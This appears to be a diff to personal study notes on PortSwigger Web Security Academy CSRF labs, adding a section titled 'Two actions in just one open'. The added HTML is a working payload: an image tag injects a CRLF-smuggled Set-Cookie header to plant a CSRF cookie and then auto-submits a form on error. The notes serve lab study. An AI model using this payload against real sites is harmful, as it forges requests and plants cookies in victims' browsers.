@@ -13,3 +13,9 @@ https://portswigger.net/web-security
 * CSRF where token is duplicated in cookie
 * CSRF where Referer validation depends on header being present
 * CSRF with broken Referer validation
+
+### Two actions in just one open
+```html
+<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" --action #1 - set a cookie
+  onerror="document.forms[0].submit()"> -- action #2 - submit
+```
